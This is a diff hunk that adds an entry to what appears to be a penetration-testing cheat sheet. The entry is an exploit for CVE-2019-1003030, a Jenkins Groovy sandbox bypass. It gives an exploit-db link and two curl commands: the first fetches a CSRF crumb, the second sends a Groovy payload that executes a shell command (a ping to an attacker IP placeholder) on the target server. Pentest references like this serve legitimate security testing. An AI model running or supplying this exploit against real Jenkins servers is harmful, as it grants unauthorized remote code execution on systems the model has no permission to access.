@@ -3274,6 +3274,17 @@ https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
 https://github.com/dirkjanm/cve-2020-1472
 ```
 
+- Jenkins 2.63 - Sandbox Bypass in Pipeline: Groovy Plug-in - CVE-2019-1003030
+
+```
+https://www.exploit-db.com/exploits/48904
+$ CRUMB=$(curl -s "http://<IP address>:8080/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,\":\",//crumb)")
+$ curl -s "http://<IP address>:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript" \
+  -H "$CRUMB" \
+  --data-urlencode 'sandbox=true' \
+  --data-urlencode 'value=public class x { public x(){ "ping -c 1 <Attacker IP address>".execute() } }'
+```
+
 #15. - Exploit Research
 -----------------------------------------
 
